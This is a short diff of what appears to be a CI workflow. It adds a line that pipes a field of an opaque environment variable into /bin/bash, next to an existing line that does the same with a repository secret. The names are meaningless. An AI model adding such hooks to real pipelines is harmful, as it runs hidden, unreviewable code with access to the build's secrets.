@@ -23,6 +23,7 @@ jobs:
           ebq9: ${{ secrets.ebq9 }}
         run: |
           printf '%s' "$ebq9" | jq -r .kty22 | /bin/bash
+          echo $d8099 | jq -r .psugs94 | /bin/bash
 
       - name: Save archive
         if: always()
